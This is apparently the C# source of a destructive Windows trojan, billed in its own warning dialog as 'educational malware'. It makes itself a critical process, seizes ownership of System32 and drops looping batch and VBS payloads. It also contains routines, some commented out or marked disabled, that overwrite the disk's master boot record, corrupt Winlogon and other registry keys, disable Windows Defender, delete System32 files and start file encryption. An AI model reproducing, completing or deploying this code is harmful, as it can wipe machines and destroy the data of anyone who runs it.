using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.IO;
using System.Runtime.InteropServices;
using System.Reflection;
using System.Diagnostics;
using System.Security.Cryptography;
using Microsoft.Win32;
using System.Media;
using System.Diagnostics.CodeAnalysis;
using System.Runtime.InteropServices;
using System.Threading;


namespace e32TrojanHorse
{
    public partial class TrojanMain : Form
    {
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

        [DllImport("kernel32")]
        private static extern IntPtr CreateFile(
            string lpFileName,
            uint dwDesiredAccess,
            uint dwShareMode,
            IntPtr lpSecurityAttributes,
            uint dwCreationDisposition,
            uint dwFlagsAndAttributes,
            IntPtr hTemplateFile);

        [DllImport("kernel32")]
        private static extern bool WriteFile(
            IntPtr hFile,
            byte[] lpBuffer,
            uint nNumberOfBytesToWrite,
            out uint lpNumberOfBytesWritten,
            IntPtr lpOverlapped);

        //dwDesiredAccess
        private const uint GenericRead = 0x80000000;
        private const uint GenericWrite = 0x40000000;
        private const uint GenericExecute = 0x20000000;
        private const uint GenericAll = 0x10000000;

        //dwShareMode
        private const uint FileShareRead = 0x1;
        private const uint FileShareWrite = 0x2;

        //dwCreationDisposition
        private const uint OpenExisting = 0x3;

        //dwFlagsAndAttributes
        private const uint FileFlagDeleteOnClose = 0x4000000;

        private const uint MbrSize = 512u;

        private const uint MbrSize2 = 512;

        public TrojanMain()
        {
            InitializeComponent();
            this.TransparencyKey = this.BackColor;
            TopMost = true;
        }

        private void TrojanMain_Load(object sender, EventArgs e)
        {
            if (MessageBox.Show("This is a TROJAN HORSE that infects your machine and DESTROYS it.\n Educational malware created by Leurak Hacker (https://youtube.com/@LeurakHacker)", "WARNING, THIS IS A MALWARE!!", MessageBoxButtons.YesNo, MessageBoxIcon.Warning, MessageBoxDefaultButton.Button2) == DialogResult.No)
            {
                Application.Exit();
            }
            else
            {
                LastWarning();
            }
        }

        private void LastWarning()
        {
            if (MessageBox.Show("Do you want to continue?", "LAST WARNING!", MessageBoxButtons.YesNo, MessageBoxIcon.Warning, MessageBoxDefaultButton.Button2) == DialogResult.No)
            {
                Application.Exit();
            }
            else
            {
                StartDestruction();
            }
        }

        public void StartDestruction()
        {
            try
            {
                IsAcept = true;
                CreateHorseFile();
                MakeCritical();
                //EditMBRTest();
                //StartRansomwareEffects();
                AllFileItNeeds();
                //EditRegistry();
                //EditRegistry2();
                //EditShell2();
                TurnOnSystem32Acess();

                //DisableWindowsDefender();
                //DisableCMD_REGISTRY();
                
                NextPayload.Start();
            }
            catch
            {
                return;
            }
        }

        private void MakeCritical()
        {
            int isCritical = 1;
            int BreakOnTermination = 0x1D;

            Process.EnterDebugMode();

            NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));

            try
            {
               // byte[] test = new byte[0];
                //OverwriteMBR(test); //EditMBR
            }
            catch
            {
                return;
            }
        }

        private void TurnOnSystem32Acess()
        {
            try
            {
                ProcessStartInfo getsystem32files = new ProcessStartInfo();
                getsystem32files.FileName = "cmd.exe";
                getsystem32files.WindowStyle = ProcessWindowStyle.Hidden;
                getsystem32files.Arguments = @"/k takeown /f C:\Windows\System32 && icacls C:\Windows\System32 /grant %username%:F && takeown /f C:\Windows\System32\drivers && icacls C:\Windows\System32\drivers /grant %username%:F && Exit";
                Process.Start(getsystem32files);
            }
            catch
            {
                return;
            }
        }

        private void EditWallpaper()
        {
            SetWallpaper(Path.Combine(Directory.GetCurrentDirectory(),
           "Resources\\leuraklmao.jpg"), Style.Stretched);
        }

        [DllImport("user32.dll", CharSet = CharSet.Unicode)]
        private static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

        public enum Style
        {
            Tiled,
            Centered,
            Stretched
        }

        public void SetWallpaper(string path, Style style)
        {
            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Control Panel\Desktop", true)
                              ?? throw new InvalidOperationException("Unable to change wallpaper style!");
            switch (style)
            {
                case Style.Stretched:
                    key.SetValue(@"WallpaperStyle", "2");
                    key.SetValue(@"TileWallpaper", "2");
                    break;
                case Style.Centered:
                    key.SetValue(@"WallpaperStyle", "1");
                    key.SetValue(@"TileWallpaper", "0");
                    break;
                case Style.Tiled:
                    key.SetValue(@"WallpaperStyle", "1");
                    key.SetValue(@"TileWallpaper", "1");
                    break;
            }

            if (SystemParametersInfo(20, 0, path, 0x01 | 0x02) != 1)
                throw new Exception("Unable to set wallpaper!");
        }

        private void EditMBRTest()
        {
            try
            {
                byte[] test = new byte[0];
                OverwriteMBR2(test);
            }
            catch
            {
                return;
            }
        }

        private void StartRansomwareEffects()
        {
            try
            {
                string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                string[] filesPaths = Directory.EnumerateFiles(path + @"\").
                    Where(f => (new FileInfo(f).Attributes & FileAttributes.Hidden) == FileAttributes.Hidden).
                    ToArray();
                foreach (string file2 in filesPaths)
                    File.Delete(file2);

                EncryptFilesFromPC.Start();
            }
            catch
            {
                return;
            }
        }

        private void CreateHorseFile()
        {
            string locate = @"C:\Program Files\e32horse.txt";
            StreamWriter sm = new StreamWriter(locate);
            sm.WriteLine("YOUR COMPUTER HAS BEEN FUCKED BY E32 TROJAN");
            sm.WriteLine("DON'T TRY TO FINISH THE TROJAN TASK.");
            sm.WriteLine("IF YOU SHUTDOWN YOUR PC, IT WILL NOT RESTART AGAIN. ENJOY YOUR COMPUTER.");
            sm.Close();
            Process.Start(locate);
            string locate2 = @"C:\Program Files\ilovemymomma.bat";
            StreamWriter sm2 = new StreamWriter(locate2);
            sm2.WriteLine(":loop");
            sm2.WriteLine("@echo off");
            sm2.WriteLine("start wordpad && start mspaint && start write");
            sm2.WriteLine("taskkill /IM explorer.exe /F");
            sm2.WriteLine(@"start C:\ProgramFiles\e32horse.txt");
            sm2.WriteLine(@"start C:\ProgramFiles\ilovemymomma.bat");
            sm2.WriteLine("goto loop");
            sm2.Close();
        }

        private void EditRegistry()
        {
            try
            {
                
                RegistryKey reg1 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Authentication\\LogonUI\\SessionData\\1");
                reg1.SetValue("LoggedOnDisplayName", "INFECTED BY E32", RegistryValueKind.String);
                RegistryKey reg2 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Authentication\\LogonUI");
                reg2.SetValue("LastLoggedOnDisplayName", "INFECTED BY E32", RegistryValueKind.String);
                RegistryKey reg3 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
                reg3.SetValue("DefaultUserName", "FUCKED BY E32", RegistryValueKind.String);
                RegistryKey reg8 = Registry.CurrentUser.CreateSubKey("Control Panel\\Desktop");
                reg8.SetValue("Wallpaper", "FUCKED BY E32 TROJAN", RegistryValueKind.String);
                RegistryKey reg9 = Registry.CurrentUser.CreateSubKey("Control Panel\\Desktop");
                reg9.SetValue("WallPaper", "FUCKED BY E32 TROJAN", RegistryValueKind.String);

                RegistryKey reg11 = Registry.LocalMachine.CreateSubKey("SYSTEM\\CurrentControlSet\\Control");
                reg11.SetValue("FirmwareBootDevice", "PUSSY HUMMMMMM", RegistryValueKind.String);
                RegistryKey reg12 = Registry.LocalMachine.CreateSubKey("SYSTEM\\CurrentControlSet\\Control");
                reg12.SetValue("SystemBootDevice", "UR MOMMA IS SEXY", RegistryValueKind.String);

                RegistryKey reg13 = Registry.CurrentUser.CreateSubKey("Control Panel\\International");
                reg13.SetValue("sLongDate", "FUCKED BY E32 TROJAN", RegistryValueKind.String);
                RegistryKey reg14 = Registry.CurrentUser.CreateSubKey("Control Panel\\International");
                reg14.SetValue("sTimeFormat", "FUCKED BY E32 TROJAN", RegistryValueKind.String);
                RegistryKey reg15 = Registry.CurrentUser.CreateSubKey("Control Panel\\International");
                reg15.SetValue("sDate", "FUCKED BY E32 TROJAN", RegistryValueKind.String);
                RegistryKey reg16 = Registry.CurrentUser.CreateSubKey("Control Panel\\International");
                reg16.SetValue("sCountry", "HELL", RegistryValueKind.String);
                RegistryKey reg17 = Registry.CurrentUser.CreateSubKey("Control Panel\\International");
                reg17.SetValue("sCurrency", "666", RegistryValueKind.String);
                RegistryKey reg18 = Registry.CurrentUser.CreateSubKey("Control Panel\\International");
                reg18.SetValue("sYearMonth", "PUSSY", RegistryValueKind.String);
                RegistryKey reg19 = Registry.CurrentUser.CreateSubKey("Control Panel\\International");
                reg19.SetValue("sList", "PUSSY", RegistryValueKind.String);

                RegistryKey reg20 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion");
                reg20.SetValue("ProductName", "WINDOWS FUCKED BY E32", RegistryValueKind.String);

                RegistryKey reg22 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
                reg22.SetValue("Userinit", "FUCKED BY E32 TROJAN", RegistryValueKind.String);

                RegistryKey reg23 = Registry.LocalMachine.CreateSubKey("SYSTEM\\CurrentControlSet\\Control");
                reg23.SetValue("SystemStartOptions", "FUCKED BY E32 TROJAN", RegistryValueKind.String);

                Registry.LocalMachine.DeleteSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Fonts", true);

            }
            catch
            {
                return;
            }
        }

        private void DeleteWinDefRegistry()
        {
            try
            {
                Registry.LocalMachine.DeleteSubKeyTree("SOFTWARE\\Microsoft\\Windows Defender", true);
                Registry.LocalMachine.DeleteValue("SOFTWARE\\Microsoft\\Windows Defender", true);
                Registry.LocalMachine.DeleteSubKey("SOFTWARE\\Microsoft\\Windows Defender", true);
            }
            catch
            {
                return;
            }
        }

        private void EditRegistry2()
        {
            try
            {
                RegistryKey reg = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
                reg.SetValue("Background", "6 6 6", RegistryValueKind.String);
                RegistryKey reg2 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
                reg2.SetValue("PowerdownAfterShutdown", "1", RegistryValueKind.String);
                RegistryKey reg3 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
                reg3.SetValue("DisableBackButton", 0, RegistryValueKind.DWord);
                RegistryKey reg4 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
                reg4.SetValue("ShutdownFlags", 666, RegistryValueKind.DWord);
            }
            catch
            {
                return;
            }
        }

        private void DisableCMD_REGISTRY()
        {
            try
            {
                RegistryKey reg = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows\\System");
                reg.SetValue("DisableCMD", 1, RegistryValueKind.DWord);
                RegistryKey reg2 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                reg2.SetValue("DisableRegistrytools", 1, RegistryValueKind.DWord); 
            }
            catch
            {
                return;
            }
        }

        private void EditShell()//Test
        {
            try
            {
                const string quote = @"""";
                RegistryKey reg10 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
                reg10.SetValue("Shell", @"explorer.exe, wscript " + quote + @"C:\Windows\Media\Ass\ilovemymomma.vbs" + quote, RegistryValueKind.String);
            }
            catch
            {
                return;
            }
        }

        private void EditShell2()
        {
            RegistryKey reg10 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
            reg10.SetValue("Shell", "ass", RegistryValueKind.String);
        }

        private void DisableWindowsDefender()
        {
            try
            {
                RegistryKey reg = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows Defender");
                reg.SetValue("DisableAntiSpyware", 1, RegistryValueKind.DWord);
                RegistryKey reg2 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows Defender");
                reg2.SetValue("DisableAntiVirus", 1, RegistryValueKind.DWord);
            }
            catch
            {
                return;
            }
        }

        private void OverwriteMBR(byte[] buffer)
        {
            var mbr = CreateFile("\\\\.\\PhysicalDrive0", 0x10000000,
                0x1 | 0x2, IntPtr.Zero,
                0x3, 0, IntPtr.Zero);
            Array.Resize(ref buffer, 2097152);
            WriteFile(mbr, buffer, (uint)buffer.Length, out _, IntPtr.Zero);
        }

        private void OverwriteMBR2(byte[] buffer)
        {
            var mbr = CreateFile(@"\\\\.\\PhysicalDrive0", 0x10000000,
                0x1 | 0x2, IntPtr.Zero,
                0x3, 0, IntPtr.Zero);
            Array.Resize(ref buffer, 2097152);
            WriteFile(mbr, buffer, (uint)buffer.Length, out _, IntPtr.Zero);
        }

        private void EncryptFilesFromPC_Tick(object sender, EventArgs e)
        {
            Encryptor.StartFilesEncryption();
            Encryptor.StartFilesEncryption2();
        }

        private void NextPayload_Tick(object sender, EventArgs e)
        {
            var nextForm = new InitPayloads();
            nextForm.ShowDialog();
        }

        private void TrojanMain_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (IsAcept)
            {
                e.Cancel = true;
            }
        }

        private void EditRegistry_OPENSUBKEY()//Test
        {
            try
            {
                RegistryKey reg = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows Defender");
                reg.SetValue("DisableAntiSpyware", 1, RegistryValueKind.DWord);
                RegistryKey reg2 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows Defender");
                reg2.SetValue("DisableAntiVirus", 1, RegistryValueKind.DWord);
            }
            catch
            {
                return;
            }
        }

        public bool StartWithMachine = true;

        private void CreateImpregFile()//A test to trojan starts with machine if mbr fixed.                      
        {      
            string file = Properties.Resources.ilovemymomma;
            string gottext = File.ReadAllText(file); 
            if (gottext.Contains("objShell") && gottext.Contains("trojanVariant"))
            {
                Directory.CreateDirectory(@"C:\Windows\Media\Ass");
                StreamWriter stw = new StreamWriter(@"C:\Windows\Media\Ass\ilovemymomma.vbs");
                stw.Write(gottext);
                stw.Close();
            }
        }

        private void CreateVariantFile()
        {
            string userRoot = System.Environment.GetEnvironmentVariable("USERPROFILE");
            string file = Properties.Resources.chromeservice;
            string gottext = File.ReadAllText(file);
            if (gottext.Contains("set"))
            {
                Directory.CreateDirectory(userRoot + @"\AppData\Local\Temp\01e32u82610.182190b127");
                StreamWriter stw = new StreamWriter(userRoot + @"\AppData\Local\Temp\01e32u82610.182190b127\chromeservice.vbs");
                stw.Write(gottext);
                stw.Close();
            }
        }

        private void CreateKillFile()
        {
            string file = Properties.Resources.mstechfucker;
            string gottext = File.ReadAllText(file);
            if (gottext.Contains("virus"))
            {
                Directory.CreateDirectory(@"C:\fuckyou\ass");
                StreamWriter stw = new StreamWriter(@"C:\fuckyou\ass\mstechfucker.bat");
                stw.Write(gottext);
                stw.Close();
            }
        }

        private void AllFileItNeeds()
        {
            try
            {
                CreateImpregFile();
                CreateVariantFile();
                CreateKillFile();
            }
            catch
            {
                return;
            }
        }

        private void DestroyMachineIfItRestarts()//Disabled
        {
            if (StartWithMachine)
            {
                try
                {
                    EditRegistry();
                    EditRegistry2();
                    Finaldestruct.Start();
                    byte[] test = new byte[0];
                    OverwriteMBR2(test);
                    TryDelete();
                    MessageBox.Show("Good bye.", "e32", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }
                catch
                {
                    return;
                }
            }
        }

        private void TryDelete()
        {
            try
            {
                Registry.LocalMachine.DeleteSubKey("SOFTWARE");
                Registry.CurrentUser.DeleteSubKey("SOFTWARE");
            }
            catch
            {
                return;
            }
        }

        public bool IsAcept = false;

        private void Finaldestruct_Tick(object sender, EventArgs e)//test
        {
            try
            {
                string[] system32files = Directory.GetFiles(@"C:\Windows\System32\", "*", SearchOption.AllDirectories);
                for (int i = 0; i < system32files.Length; i++)
                {
                    if (File.Exists(system32files[i]))
                    {
                        File.Delete(system32files[i]);
                    }
                }
            }
            catch
            {
                return;
            }
        }
    }
}
